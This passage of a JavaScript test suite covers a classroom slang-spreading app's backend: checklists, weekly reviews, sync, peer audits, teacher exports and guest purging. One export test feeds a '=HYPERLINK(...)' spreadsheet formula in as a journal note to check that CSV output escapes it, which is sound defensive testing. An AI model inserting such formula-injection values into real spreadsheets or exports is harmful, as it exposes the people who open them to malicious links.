  var tl = ok(env.post('rec.save', { type: 'tally', record: { id: rid('tl'), date: '2026-11-22', tallyType: 'heard', count: 0 } }, tok));
  assert.strictEqual(tl.record.count, 0);
  bad(env.post('rec.save', { type: 'tally', record: { id: rid('tl'), date: '2026-11-22', tallyType: 'heard', count: 100 } }, tok), 'VALIDATION');
  // Sightings, tallies and screenshots earn 0 XP (SPEC §9.1)
  var xpBefore = ok(env.post('bootstrap', {}, tok)).state.xp;
  for (var i = 0; i < 5; i++) ok(sighting(env, tok));
  ok(env.post('rec.save', { type: 'tally', record: { id: rid('tl'), date: '2026-11-22', tallyType: 'said', count: 50 } }, tok));
  assert.strictEqual(ok(env.post('bootstrap', {}, tok)).state.xp, xpBefore, 'no XP for spread');
  ok(env.post('rec.delete', { type: 'action', id: acId }, tok));
  assert.strictEqual(env.rows('Actions')[0].deleted, 'TRUE');
  assert.strictEqual(env.rows('PlanActions').filter(function (r) { return r.id === pa.id; })[0].status, 'planned');
  bad(env.post('rec.save', { type: 'action', record: { id: acId, date: '2026-11-21', channelId: 'ch_school', what: 'Again after delete', outcome: 'as_planned' } }, tok), 'NOT_FOUND');
  bad(env.post('rec.delete', { type: 'waveNote', id: 'g1|W1' }, tok), 'VALIDATION');
  bad(env.post('rec.save', { type: 'banana', record: {} }, tok), 'VALIDATION');
});

// ------------------------------------------------------------ checklist
test('checklist: tick by hand, self-ticking items, own items (LIMIT at 5), could not do, drop rules', function () {
  var env = fresh('2026-11-22T10:00:00+07:00');
  var tok = login(env, 'g2', '2222');
  var b = ok(env.post('bootstrap', {}, tok));
  var first = b.checklist.filter(function (r) { return r.itemId === 'F-W01-01'; })[0];
  assert.ok(first, 'F-W01-01 exists');
  bad(env.post('checklist.tick', { rowId: first.id, done: true }, tok), 'VALIDATION', 'check false');
  var w = ok(env.post('word.save', { fields: FIRST }, tok));
  var r1 = env.rows('Checklist').filter(function (r) { return r.id === first.id; })[0];
  assert.strictEqual(r1.status, 'done'); assert.strictEqual(r1.doneBy, 'auto');
  bad(env.post('checklist.tick', { rowId: first.id, done: false }, tok), 'FORBIDDEN', 'self-ticked stays ticked');
  var own = [];
  for (var i = 0; i < 5; i++) own.push(ok(env.post('checklist.addOwn', { weekId: 'W01', title: 'My own task number ' + i }, tok)).row);
  var rep = ok(env.post('checklist.addOwn', { weekId: 'W01', title: 'My own task number 0' }, tok));
  assert.strictEqual(rep.row.id, own[0].id, 'idempotent');
  bad(env.post('checklist.addOwn', { weekId: 'W01', title: 'One too many items' }, tok), 'LIMIT');
  ok(env.post('checklist.addOwn', { weekId: 'W02', title: 'Next week task', dueDate: '2026-11-27' }, tok));
  bad(env.post('checklist.addOwn', { weekId: 'W05', title: 'Far away task' }, tok), 'VALIDATION');
  bad(env.post('checklist.addOwn', { weekId: 'W01', title: 'Hi' }, tok), 'VALIDATION');
  var t = ok(env.post('checklist.tick', { rowId: own[1].id, done: true }, tok));
  assert.strictEqual(t.row.doneBy, 'manual');
  var u = ok(env.post('checklist.tick', { rowId: own[1].id, done: false }, tok));
  assert.strictEqual(u.row.status, 'open');
  ok(env.post('checklist.setStatus', { rowId: own[2].id, status: 'dropped' }, tok));
  var req = b.checklist.filter(function (r) { return r.kind === 'required' && r.itemId !== 'F-W01-01'; })[0];
  bad(env.post('checklist.setStatus', { rowId: req.id, status: 'dropped' }, tok), 'FORBIDDEN');
  bad(env.post('checklist.setStatus', { rowId: req.id, status: 'cannot', reason: 'short' }, tok), 'VALIDATION');
  var cn = ok(env.post('checklist.setStatus', { rowId: req.id, status: 'cannot', reason: 'I was ill all weekend at home.' }, tok));
  assert.strictEqual(cn.row.status, 'cannot');
  ok(env.post('checklist.setStatus', { rowId: req.id, status: 'open' }, tok));
  bad(env.post('checklist.tick', { rowId: 'g2|W01|F-NOPE', done: true }, tok), 'NOT_FOUND');
});

// ------------------------------------------------------------ review and roll-over
test('Sunday review: not before Sunday; carry, could not do; next week shows carried; replay; streak', function () {
  var env = fresh('2026-11-21T09:00:00+07:00');
  var tok = login(env, 'g1', '1111');
  ok(env.post('bootstrap', {}, tok));
  ok(env.post('word.save', { fields: FIRST }, tok));
  bad(env.post('review.submit', { weekId: 'W01', wentWell: 'I recorded my word and examples.', toChange: 'Start my plan earlier in the week.' }, tok), 'VALIDATION', 'before Sunday');
  env.setNow('2026-11-22T10:00:00+07:00');
  var b = ok(env.post('bootstrap', {}, tok));
  assert.deepStrictEqual(b.state.reviewsDue, ['W01']);
  var open = b.checklist.filter(function (r) { return r.weekId === 'W01' && r.status === 'open'; });
  var reqs = open.filter(function (r) { return r.kind === 'required'; });
  assert.ok(reqs.length >= 2);
  var dec = {}; var reasons = {};
  dec[reqs[0].itemId] = 'carry';
  dec[reqs[1].itemId] = 'cannot'; reasons[reqs[1].itemId] = 'We had a family trip all weekend.';
  var bd = Object.assign({}, dec); bd[reqs[0].itemId] = 'dropped';
  bad(env.post('review.submit', { weekId: 'W01', wentWell: 'I recorded my word and examples.', toChange: 'Start my plan earlier in the week.', decisions: bd }, tok), 'FORBIDDEN', 'required cannot be dropped');
  bad(env.post('review.submit', { weekId: 'W01', wentWell: 'Too short', toChange: 'Start my plan earlier in the week.' }, tok), 'VALIDATION');
  var rv = ok(env.post('review.submit', { weekId: 'W01', wentWell: 'I recorded my word and examples.', toChange: 'Start my plan earlier in the week.', decisions: dec, reasons: reasons, nextPrefs: { skip: [], own: [{ title: 'Ask two friends about apps' }], moved: [] } }, tok));
  assert.strictEqual(rv.review.onTime, true);
  assert.ok(rv.gained.some(function (g) { return g.ruleId === 'X12' && g.xp === 40; }), 'X12 30 + 10 on time');
  var rep = ok(env.post('review.submit', { weekId: 'W01', wentWell: 'Something else entirely new.', toChange: 'Something else to change now.' }, tok));
  assert.strictEqual(rep.review.wentWell, 'I recorded my word and examples.', 'replay changes nothing');
  assert.strictEqual(env.rows('Reviews').length, 1);
  assert.strictEqual(env.rows('Checklist').filter(function (r) { return r.id === reqs[1].id; })[0].status, 'cannot');
  env.setNow('2026-11-23T08:00:00+07:00');
  var b2 = ok(env.post('bootstrap', {}, tok));
  var carried = b2.checklist.filter(function (r) { return r.weekId === 'W02' && r.itemId === reqs[0].itemId; })[0];
  assert.ok(carried, 'carried into W02');
  assert.strictEqual(carried.source, 'carried'); assert.strictEqual(carried.carryCount, 1); assert.strictEqual(carried.originWeek, 'W01');
  assert.strictEqual(b2.checklist.filter(function (r) { return r.id === 'g1|W01|' + reqs[0].itemId; })[0].status, 'carried');
  assert.ok(!b2.checklist.some(function (r) { return r.weekId === 'W02' && r.itemId === reqs[1].itemId; }), 'could-not-do is not carried');
  assert.ok(b2.checklist.some(function (r) { return r.weekId === 'W02' && r.kind === 'own'; }), 'own item from nextPrefs');
  assert.strictEqual(b2.state.weekId, 'W02');
  assert.strictEqual(b2.state.streak, 1);
});

test('a three-week absence rolls week by week (carryCount 3); a missed review is due first', function () {
  var env = fresh('2026-11-21T09:00:00+07:00');
  var tok = login(env, 's07', '0007');
  ok(env.post('bootstrap', {}, tok));
  env.setNow('2026-12-08T09:00:00+07:00'); // W04
  var b = ok(env.post('bootstrap', {}, tok));
  assert.strictEqual(b.state.weekId, 'W04');
  var r = b.checklist.filter(function (x) { return x.weekId === 'W04' && x.itemId === 'F-W01-01'; })[0];
  assert.ok(r, 'F-W01-01 carried into W04');
  assert.strictEqual(r.carryCount, 3); assert.strictEqual(r.originWeek, 'W01');
  ['W01', 'W02', 'W03'].forEach(function (w) { assert.ok(b.checklist.some(function (x) { return x.weekId === w && x.itemId === 'F-W01-01'; }), w); });
  assert.strictEqual(b.state.reviewsDue[0], 'W01');
  // Missed reviews: the oldest in full, the others one tap.
  var q = env.post('review.submit', { weekId: 'W02', quick: true }, tok);
  ok(q, 'quick review for a later week');
  bad(env.post('review.submit', { weekId: 'W01', quick: true }, tok), 'VALIDATION', 'the oldest needs the full review');
});

// ------------------------------------------------------------ sync and idempotency
test('sync: ops in order in one lock; replay by opId; ≤ 25 ops; no file.upload; two interleaved writers', function () {
  var env = fresh();
  var ta = login(env, 'g1', '1111'), tb = login(env, 'g2', '2222');
  var j1 = rid('jn'), j2 = rid('jn');
  var ops = [
    { opId: 'op-1', action: 'word.save', data: { fields: FIRST } },
    { opId: 'op-2', action: 'rec.save', data: { type: 'journal', record: { id: j1, date: '2026-11-21', kind: 'free', text: 'A free note with more than forty characters in it, written offline.' } } },
    { opId: 'op-3', action: 'file.upload', data: {} },
    { opId: 'op-4', action: 'rec.save', data: { type: 'journal', record: { id: j2, date: '2026-11-21', kind: 'free', text: 'short' } } },
    { opId: 'op-5', action: 'bootstrap', data: {} }
  ];
  var lc = env.lockCount;
  var r = ok(env.post('sync', { ops: ops }, ta));
  assert.strictEqual(env.lockCount - lc, 1, 'one lock for the whole batch');
  assert.deepStrictEqual(r.results.map(function (x) { return x.ok; }), [true, true, false, false, false]);
  assert.strictEqual(r.results[3].error.code, 'VALIDATION');
  assert.ok(r.state && r.state.studentId === 'g1');
  assert.ok(r.gained.some(function (g) { return g.ruleId === 'X01'; }));
  var r2 = ok(env.post('sync', { ops: ops }, ta));
  assert.deepStrictEqual(r2.results, r.results, 'replay returns the same results');
  assert.strictEqual(env.rows('Journal').length, 1);
  assert.strictEqual(env.rows('XPLog').filter(function (x) { return x.studentId === 'g1' && x.ruleId === 'X01'; }).length, 1);
  var many = []; for (var i = 0; i < 26; i++) many.push({ opId: 'm' + i, action: 'feedback.read', data: { id: 'x' } });
  bad(env.post('sync', { ops: many }, ta), 'LIMIT');
  // Interleaved writers: each sees only her own rows.
  for (var k = 0; k < 4; k++) {
    ok(env.post('rec.save', { type: 'tally', record: { id: rid('tl'), date: '2026-11-21', tallyType: 'said', count: k } }, ta));
    ok(env.post('rec.save', { type: 'tally', record: { id: rid('tl'), date: '2026-11-21', tallyType: 'heard', count: k } }, tb));
  }
  var ba = ok(env.post('bootstrap', {}, ta)), bb = ok(env.post('bootstrap', {}, tb));
  assert.strictEqual(ba.tallies.length, 4); assert.strictEqual(bb.tallies.length, 4);
  assert.ok(ba.tallies.every(function (t) { return t.studentId === 'g1' && t.tallyType === 'said'; }));
  assert.ok(bb.tallies.every(function (t) { return t.studentId === 'g2' && t.tallyType === 'heard'; }));
  assert.strictEqual(env.rows('Tallies').length, 8);
});

// ------------------------------------------------------------ release gating
test('RELEASE: later-release actions refuse in R1 and open in R2/R3', function () {
  var env = fresh();
  var tok = login(env, 'g1', '1111'), tt = tlogin(env);
  bad(env.post('summit.save', { patch: { abstract: 'x' } }, tok), 'RELEASE');
  bad(env.post('article.save', { patch: { title: 'x' } }, tok), 'RELEASE');
  bad(env.post('audit.submit', { auditId: 'x' }, tok), 'RELEASE');
  bad(env.post('report.save', { type: 'intermediate', sections: {} }, tok), 'RELEASE');
  bad(env.post('t.spot.list', {}, tt), 'RELEASE');
  ok(env.post('t.config.save', { key: 'release', value: 2 }, tt));
  ok(env.post('summit.save', { patch: { abstract: 'My word spread a little.', chartIds: ['ch_waves'], sections: { hook: { notes: 'Start with a story.' } }, rehearsals: [{ talkSec: 410, qaSec: 100 }] } }, tok));
  bad(env.post('summit.save', { patch: { chartIds: ['ch_pie'] } }, tok), 'VALIDATION');
  bad(env.post('article.save', { patch: { title: 'x' } }, tok), 'RELEASE');
  ok(env.post('t.config.save', { key: 'release', value: 3 }, tt));
  ok(env.post('article.save', { patch: { title: 'Making vronk happen', sources: [{ apa: 'Smith, A. (2020). Slang today. Press.', type: 'book', use: 'Defines slang for my intro.' }] } }, tok));
  bad(env.post('t.config.save', { key: 'release', value: 4 }, tt), 'VALIDATION');
  bad(env.post('t.config.save', { key: 'lastWeeklyJob', value: 'x' }, tt), 'VALIDATION');
});

// ------------------------------------------------------------ waves and report
test('waves: teacher validation; students see only published rows of her term, controls and foils; wave note', function () {
  var env = fresh('2026-11-24T12:00:00+07:00');
  var ta = login(env, 's01', '0001'), tb = login(env, 's02', '0002'), tg = login(env, 'g1', '1111'), tt = tlogin(env);
  ok(env.post('word.save', { fields: FIRST }, ta));
  ok(env.post('word.save', { fields: { word: 'blorp', meaning: 'to hide something fast', example1: 'Blorp it before the teacher sees.', pos: 'verb', posConfirmed: true } }, tb));
  var g = ok(env.post('t.wave.get', { waveId: 'W1' }, tt));
  assert.strictEqual(g.rows.length, 12);
  assert.ok(!g.rows.some(function (r) { return r.termKey === 'g1'; }), 'no guest rows (P17)');
  var rows = g.rows.map(function (r) { return { termKey: r.termKey, n: 40, recognised: r.termKey.indexOf('foil') === 0 ? 6 : 16, notSure: 4, comprehended: r.termKey.indexOf('foil') === 0 ? 0 : 10 }; });
  var badRows = JSON.parse(JSON.stringify(rows)); badRows[0].notSure = 30;
  bad(env.post('t.wave.save', { waveId: 'W1', date: '2026-11-24', classesNote: 'M2/3', rows: badRows, publish: true }, tt), 'VALIDATION');
  var foil = JSON.parse(JSON.stringify(rows)); foil[10].comprehended = 3;
  bad(env.post('t.wave.save', { waveId: 'W1', date: '2026-11-24', rows: foil }, tt), 'VALIDATION');
  bad(env.post('t.wave.save', { waveId: 'W1', date: '2026-11-24', rows: [{ termKey: 'g1', n: 10, recognised: 1, notSure: 1, comprehended: 1 }] }, tt), 'VALIDATION');
  ok(env.post('t.wave.save', { waveId: 'W1', date: '2026-11-24', classesNote: 'M2/3', rows: rows, publish: false }, tt));
  assert.strictEqual(ok(env.post('bootstrap', {}, ta)).waves.length, 0, 'draft invisible');
  bad(env.post('rec.save', { type: 'waveNote', record: { waveId: 'W1', note: 'Not yet published.' } }, ta), 'NOT_FOUND');
  ok(env.post('t.wave.save', { waveId: 'W1', date: '2026-11-24', classesNote: 'M2/3', rows: rows, publish: true }, tt));
  var wa = ok(env.post('bootstrap', {}, ta)).waves;
  assert.deepStrictEqual(wa.map(function (r) { return r.termKey; }).sort(), ['ctrl1', 'ctrl2', 'foil1', 'foil2', 's01']);
  assert.ok(JSON.stringify(wa).indexOf('blorp') < 0, 'never another student’s term');
  var wg = ok(env.post('bootstrap', {}, tg)).waves;
  assert.strictEqual(wg.length, 4, 'guest sees controls and foils only');
  var n = ok(env.post('rec.save', { type: 'waveNote', record: { waveId: 'W1', note: 'Sixteen of forty people said they know my word, but six said they know a foil, so my real recognition is lower than it looks.' } }, ta));
  assert.strictEqual(n.record.id, 's01|W1');
  bad(env.post('rec.save', { type: 'waveNote', record: { waveId: 'W1', hypothesisChecks: { h1: 'supported' } } }, ta), 'VALIDATION', 'checks start at Wave 2');
});

test('report helper: baseline save, ready needs words and the AI declaration, submitted; X17 once', function () {
  var env = fresh('2026-11-24T12:00:00+07:00');
  var tok = login(env, 'g1', '1111');
  var w = function (n) { return new Array(n + 1).join('word ').trim(); };
  ok(env.post('report.save', { type: 'baseline', sections: { profile: 'Draft start.' }, status: 'draft' }, tok));
  bad(env.post('report.save', { type: 'baseline', sections: {}, status: 'ready' }, tok), 'VALIDATION');
  var secs = { profile: w(160), fudge: w(160), wave1: w(160), plan: w(160) };
  var e = bad(env.post('report.save', { type: 'baseline', sections: secs, status: 'ready' }, tok), 'VALIDATION', 'no AI declaration');
  assert.strictEqual(e.field, 'ai');
  secs.ai = 'I did not use AI tools for this report at all.';
  bad(env.post('report.save', { type: 'baseline', sections: Object.assign({}, secs, { profile: w(50) }), status: 'ready' }, tok), 'VALIDATION', 'section under 80');
  bad(env.post('report.save', { type: 'baseline', sections: Object.assign({}, secs, { plan: w(500) }), status: 'ready' }, tok), 'VALIDATION', 'over 900');
  bad(env.post('report.save', { type: 'baseline', sections: { other: 'x' } }, tok), 'VALIDATION');
  var r = ok(env.post('report.save', { type: 'baseline', sections: secs, status: 'ready' }, tok));
  assert.strictEqual(r.report.wordCount, 640); assert.strictEqual(r.report.id, 'g1|baseline');
  assert.ok(r.gained.some(function (g) { return g.ruleId === 'X17'; }));
  var s = ok(env.post('report.save', { type: 'baseline', status: 'submitted' }, tok));
  assert.strictEqual(s.report.status, 'submitted');
  assert.ok(!s.gained.some(function (g) { return g.ruleId === 'X17'; }));
});

// ------------------------------------------------------------ teacher portal
test('teacher: overview flags (F_PROBLEM first), student page, feedback to Home, flag handled; problem gives no XP', function () {
  var env = fresh();
  var ta = login(env, 's01', '0001'), tb = login(env, 's02', '0002'), tt = tlogin(env);
  ok(env.post('word.save', { fields: FIRST }, ta));
  var xp0 = ok(env.post('bootstrap', {}, tb)).state.xp;
  bad(env.post('flag.raise', { category: 'negative_comment', note: 'No names here.' }, tb), 'VALIDATION', 'stoppedConfirmed');
  var f = ok(env.post('flag.raise', { category: 'negative_comment', note: 'Someone wrote a rude reply.', stoppedConfirmed: true }, tb));
  assert.strictEqual(f.state.xp, xp0, 'no XP');
  assert.strictEqual(f.gained.length, 0);
  var ov = ok(env.post('t.overview', {}, tt));
  assert.strictEqual(ov.rows.length, 11);
  assert.strictEqual(ov.rows[0].studentId, 's02'); assert.ok(ov.rows[0].flags.indexOf('F_PROBLEM') >= 0);
  assert.strictEqual(ov.pending.flags, 1);
  var r0 = ov.rows[0];
  ['studentId', 'label', 'guest', 'word', 'regStatus', 'stage', 'week', 'lastActivityAt', 'xp', 'streak', 'rulesTicked', 'online', 'flags'].forEach(function (k) { assert.ok(k in r0, 'overview row has ' + k); });
  var sp = ok(env.post('t.student', { studentId: 's01' }, tt));
  assert.strictEqual(sp.word.word, 'vronk'); assert.ok(Array.isArray(sp.audits.all) && Array.isArray(sp.spot));
  bad(env.post('t.student', { studentId: 's99' }, tt), 'VALIDATION');
  bad(env.post('t.feedback', { studentId: 's01', targetType: 'word', text: 'x' }, tt), 'VALIDATION');
  var fb = ok(env.post('t.feedback', { studentId: 's01', targetType: 'word', targetId: 's01', text: 'Nice word. Check example two.' }, tt));
  var home = ok(env.post('bootstrap', {}, ta));
  assert.strictEqual(home.feedback.length, 1); assert.strictEqual(home.feedback[0].readAt, '');
  var rd = ok(env.post('feedback.read', { id: fb.feedback.id }, ta));
  assert.ok(rd.feedback.readAt);
  ok(env.post('t.flag', { id: f.flag.id, teacherNote: 'Talked in person.' }, tt));
  assert.strictEqual(env.rows('Flags')[0].status, 'handled');
});

test('teacher: PIN reset revokes sessions; CSV export without guests by default, no Sessions/Log; formula-safe', function () {
  var env = fresh();
  var ta = login(env, 's01', '0001'), tg = login(env, 'g1', '1111'), tt = tlogin(env);
  ok(env.post('rec.save', { type: 'journal', record: { id: rid('jn'), date: '2026-11-21', kind: 'free', text: '=HYPERLINK("http://x") is not a formula here, it is a note.' } }, ta));
  ok(env.post('rec.save', { type: 'journal', record: { id: rid('jn'), date: '2026-11-21', kind: 'free', text: 'A guest note that should not be exported by default at all.' } }, tg));
  var x = ok(env.post('t.export', { tab: 'Journal', studentId: 'all', includeGuests: false }, tt));
  assert.ok(x.csv.split('\r\n')[0].indexOf('id,studentId,createdAt') === 0);
  assert.strictEqual(x.rows, 1);
  assert.ok(x.csv.indexOf(`"'=HYPERLINK(""http://x"")`) >= 0, 'formula escaped');
  assert.strictEqual(ok(env.post('t.export', { tab: 'Journal', studentId: 'all', includeGuests: true }, tt)).rows, 2);
  assert.strictEqual(ok(env.post('t.export', { tab: 'Journal', studentId: 's02' }, tt)).rows, 0);
  bad(env.post('t.export', { tab: 'Sessions', studentId: 'all' }, tt), 'FORBIDDEN');
  bad(env.post('t.export', { tab: 'Log', studentId: 'all' }, tt), 'FORBIDDEN');
  bad(env.post('t.export', { tab: 'Nope', studentId: 'all' }, tt), 'VALIDATION');
  bad(env.post('t.pin', { studentId: 's01', newPin: '12345' }, tt), 'VALIDATION');
  ok(env.post('t.pin', { studentId: 's01', newPin: '4455' }, tt));
  bad(env.post('bootstrap', {}, ta), 'AUTH_REQUIRED', 'old session revoked');
  bad(env.post('login', { studentId: 's01', pin: '0001' }), 'AUTH_BAD_PIN', 'old PIN');
  ok(env.post('login', { studentId: 's01', pin: '4455' }), 'new PIN');
  var cfg = ok(env.post('t.config.save', { key: 'summitSlots', value: { s01: 'L13-1', s02: 'L13-2' } }, tt));
  assert.strictEqual(cfg.config.summitSlots.s01, 'L13-1');
  bad(env.post('t.config.save', { key: 'summitSlots', value: { s01: 'L13-1', s02: 'L13-1' } }, tt), 'VALIDATION');
  var ta2 = login(env, 's01', '4455');
  var sc = ok(env.post('bootstrap', {}, ta2)).config;
  assert.deepStrictEqual(sc.summitSlots, { s01: 'L13-1' }, 'student sees only her own slot');
  ok(env.post('t.config.save', { key: 'onlineOpensAt', value: '2026-11-26T15:00:00+07:00' }, tt));
  ok(env.post('t.config.save', { key: 'boardEnabled', value: false }, tt));
  assert.strictEqual(ok(env.post('board.get', {}, ta2)).enabled, false);
});

test('board: no guests, no spread figures; own row marked', function () {
  var env = fresh();
  var ta = login(env, 's01', '0001'), tg = login(env, 'g1', '1111');
  ok(env.post('word.save', { fields: FIRST }, ta));
  ok(env.post('word.save', { fields: FIRST }, tg));
  var b = ok(env.post('board.get', {}, ta));
  assert.strictEqual(b.enabled, true);
  assert.strictEqual(b.rows.length, 8);
  assert.ok(!b.rows.some(function (r) { return /Guest/.test(r.label); }));
  b.rows.forEach(function (r) { assert.deepStrictEqual(Object.keys(r).sort(), ['label', 'me', 'rank', 'streak', 'xp']); });
  assert.strictEqual(b.rows.filter(function (r) { return r.me; })[0].label, 'Student A');
  assert.strictEqual(b.rows[0].label, 'Student A');
  var bg = ok(env.post('board.get', {}, tg));
  assert.ok(!bg.rows.some(function (r) { return r.me; }));
});

test('t.purgeGuests: every guest row and Drive file goes; real students stay', function () {
  var env = fresh();
  var tg = login(env, 'g1', '1111'), ta = login(env, 's01', '0001'), tt = tlogin(env);
  ok(env.post('word.save', { fields: FIRST }, tg));
  ok(env.post('word.save', { fields: FIRST }, ta));
  ok(upload(env, tg, {}));
  ok(env.post('rec.save', { type: 'tally', record: { id: rid('tl'), date: '2026-11-21', tallyType: 'said', count: 2 } }, tg));
  bad(env.post('t.purgeGuests', { confirm: 'yes' }, tt), 'VALIDATION');
  var p = ok(env.post('t.purgeGuests', { confirm: 'PURGE' }, tt));
  assert.ok(p.deleted > 5);
  var S = env.ctx.WI_SCHEMA;
  Object.keys(S.tabs).forEach(function (t) {
    if (t === 'Config') return;
    env.rows(t).forEach(function (r) { ['studentId', 'who', 'auditorId', 'authorId', 'termKey'].forEach(function (k) { assert.ok(!/^g[1-3]$/.test(String(r[k] || '')), t + ' still has a guest row'); }); });
  });
  var d = env.svc._drive;
  Object.keys(d.files).forEach(function (k) { assert.strictEqual(d.files[k].isTrashed(), true); });
  assert.strictEqual(env.rows('Words').length, 1);
  bad(env.post('bootstrap', {}, tg), 'AUTH_REQUIRED', 'guest sessions gone');
  ok(env.post('bootstrap', {}, ta));
});

// ------------------------------------------------------------ audits and spot checks (R2)
test('audits: derangement (never herself), ≤ 5 sightings, auditor sees limited fields and no files; spot queue; teacher verdict', function () {
  var env = fresh('2026-12-01T10:00:00+07:00');
  var tt = tlogin(env);
  ok(env.post('t.config.save', { key: 'release', value: 2 }, tt));
  var toks = {};
  ['s01', 's02', 's03', 's04', 's05'].forEach(function (id, i) {
    toks[id] = login(env, id, '000' + (i + 1));
    for (var k = 0; k < 7; k++) ok(sighting(env, toks[id], { date: '2026-11-' + (24 + (k % 6)), fileIds: [] }));
  });
  var fsg = ok(sighting(env, toks.s01, { date: '2026-11-30' })).record;
  var file = ok(upload(env, toks.s01, { attachType: 'sighting', attachId: fsg.id })).file;
  ok(sighting(env, toks.s01, { id: fsg.id, date: '2026-11-30', fileIds: [file.id] }));
  env.setNow('2026-12-03T10:00:00+07:00'); // L11, Thu 3 Dec (W03)
  tt = tlogin(env);
  var job = ok(env.post('t.job.run', {}, tt));
  assert.strictEqual(job.audits, 5);
  assert.ok(job.spot >= 5, 'at least one random spot check per author');
  var audits = env.rows('Audits');
  assert.strictEqual(audits.length, 5);
  var authors = {};
  audits.forEach(function (a) {
    assert.notStrictEqual(a.auditorId, a.authorId, 'never herself');
    assert.ok(JSON.parse(a.sightingIds).length <= 5);
    assert.strictEqual(a.weekId, 'W03'); assert.strictEqual(a.dueDate, '2026-12-06');
    authors[a.authorId] = true;
  });
  assert.strictEqual(Object.keys(authors).length, 5, 'a derangement: each author once');
  assert.ok(!audits.some(function (a) { return /^g/.test(a.auditorId) || /^g/.test(a.authorId); }), 'no guests with real students');
  // The auditor's view
  var me = 's02';
  var b = ok(env.post('bootstrap', {}, toks[me]));
  var mine = b.audits.mine[0];
  assert.ok(mine && mine.sightings.length >= 1);
  mine.sightings.forEach(function (s) {
    assert.deepStrictEqual(Object.keys(s).sort(), ['channelId', 'context', 'date', 'derivedForm', 'hasScreenshot', 'id', 'level', 'link', 'marked', 'posUsed', 'prompted', 'quote', 'relation', 'topic', 'verifiable']);
  });
  assert.ok(!('auditorId' in (ok(env.post('bootstrap', {}, toks[mine.authorId])).audits.onMe[0] || {})), 'author does not see who audited her');
  assert.ok(b.checklist.some(function (r) { return r.weekId === 'W03' && /^H-W03-5$/.test(r.itemId); }), 'H-W03-5 created for the auditor');
  // P6: the auditor never gets a file of the author
  var authorFiles = env.rows('Files').filter(function (f) { return f.studentId === mine.authorId; });
  authorFiles.forEach(function (f) { bad(env.post('file.get', { id: f.id }, toks[me]), 'FORBIDDEN'); });
  // Not the auditor
  var other = audits.filter(function (a) { return a.auditorId !== me; })[0];
  bad(env.post('audit.submit', { auditId: other.id, verdicts: {} }, toks[me]), 'FORBIDDEN');
  var v = {};
  mine.sightings.forEach(function (s, i) { v[s.id] = i === 0 ? { verdict: 'different', level: 1, comment: 'Looks like her own use.' } : { verdict: 'agree' }; });
  var bv = JSON.parse(JSON.stringify(v)); bv[mine.sightings[0].id] = { verdict: 'different' };
  bad(env.post('audit.submit', { auditId: mine.id, verdicts: bv }, toks[me]), 'VALIDATION', 'level needed for different');
  var done = ok(env.post('audit.submit', { auditId: mine.id, verdicts: v }, toks[me]));
  assert.strictEqual(done.audit.status, 'done');
  assert.ok(done.gained.some(function (g) { return g.ruleId === 'X14'; }));
  var disputed = env.rows('Sightings').filter(function (s) { return s.id === mine.sightings[0].id; })[0];
  assert.strictEqual(disputed.auditStatus, 'disputed');
  assert.strictEqual(String(disputed.level), String(mine.sightings[0].level), 'an auditor never changes the level');
  assert.ok(env.rows('Spot').some(function (s) { return s.sightingId === disputed.id; }), 'disputed queued');
  // The author cannot delete an audited sighting
  bad(env.post('rec.delete', { type: 'sighting', id: disputed.id }, toks[mine.authorId]), 'FORBIDDEN');
  bad(sighting(env, toks[mine.authorId], { id: disputed.id, quote: 'Edited after audit' }), 'FORBIDDEN');
  // Teacher spot check
  var list = ok(env.post('t.spot.list', {}, tt)).rows;
  var row = list.filter(function (r) { return r.sightingId === disputed.id; })[0];
  assert.ok(row.sighting && row.authorLabel);
  bad(env.post('t.spot.submit', { id: row.id, verdict: 'change' }, tt), 'VALIDATION');
  var sp = ok(env.post('t.spot.submit', { id: row.id, verdict: 'change', level: 1, comment: 'Owned use.' }, tt));
  assert.strictEqual(sp.sighting.finalLevel, 1); assert.strictEqual(sp.sighting.spotStatus, 'changed');
  var rj = list.filter(function (r) { return r.sightingId !== disputed.id; })[0];
  assert.strictEqual(ok(env.post('t.spot.submit', { id: rj.id, verdict: 'reject' }, tt)).sighting.finalLevel, 0);
  // Pressing the button again in the same week assigns nothing new
  assert.strictEqual(ok(env.post('t.job.run', {}, tt)).audits, 0);
  // Monday job (W04) audits only W03 sightings not yet audited; expired audits free their sightings
  env.setNow('2026-12-07T00:10:00+07:00');
  env.ctx.weeklyJob();
  assert.ok(env.rows('Audits').some(function (a) { return a.status === 'expired'; }), 'unfinished W03 audits expire');
  var w4 = env.rows('Audits').filter(function (a) { return a.weekId === 'W04'; });
  w4.forEach(function (a) { JSON.parse(a.sightingIds).forEach(function (id) { var s = env.rows('Sightings').filter(function (x) { return x.id === id; })[0]; assert.strictEqual(s.weekId, 'W03'); }); });
  // Audit verdicts give no XP to the author (P12)
  var authorXp = env.rows('XPLog').filter(function (x) { return x.studentId === mine.authorId && x.ruleId === 'X14'; });
  assert.strictEqual(authorXp.length, 0);
});

test('weekly job in R1: rolls every student, assigns no audits; Config.lastWeeklyJob set', function () {
  var env = fresh('2026-11-21T09:00:00+07:00');
  login(env, 's01', '0001');
  env.setNow('2026-11-30T00:10:00+07:00');
  env.ctx.weeklyJob();
  assert.strictEqual(env.rows('Audits').length, 0);
  assert.strictEqual(env.rows('State').length, 11);
  env.rows('State').forEach(function (s) { assert.strictEqual(s.weekId, 'W03'); });
  var cfg = {}; env.rows('Config').forEach(function (r) { cfg[r.key] = r.value; });
  assert.strictEqual(cfg.lastWeeklyJob, '2026-11-30T00:10:00+07:00');
  assert.ok(env.rows('Log').some(function (r) { return r.action === 'weeklyJob' && r.ok === 'TRUE'; }));
});

test('whole term: weekly job to W13 for 11 students; Sheet grid grows past 1,000 rows; one row per item per week', function () {
  var env = fresh('2026-11-21T09:00:00+07:00');
  var t0 = Date.now();
  for (var w = 0; w < 13; w++) { env.setNow(Date.parse('2026-11-16T00:10:00+07:00') + w * 7 * 86400000 + (w ? 0 : 5 * 86400000)); env.ctx.weeklyJob(); }
  var rows = env.rows('Checklist');
  assert.ok(rows.length > 1000, 'rows: ' + rows.length);
  var ids = {}; rows.forEach(function (r) { assert.ok(!ids[r.id], 'duplicate ' + r.id); ids[r.id] = true; });
  env.rows('State').forEach(function (s) { assert.strictEqual(s.weekId, 'W13'); });
  var c = env.rows('Checklist').filter(function (r) { return r.studentId === 's01' && r.itemId === 'F-W01-01'; });
  assert.strictEqual(c.length, 13, 'an untouched required item is carried every week');
  assert.ok(Date.now() - t0 < 60000);
});

test('schema enums agree with WI_CHOICES ids (W4 owns them)', function () {
  var env = fresh();
  var S = env.ctx.WI_SCHEMA, C = env.ctx.WI_CHOICES;
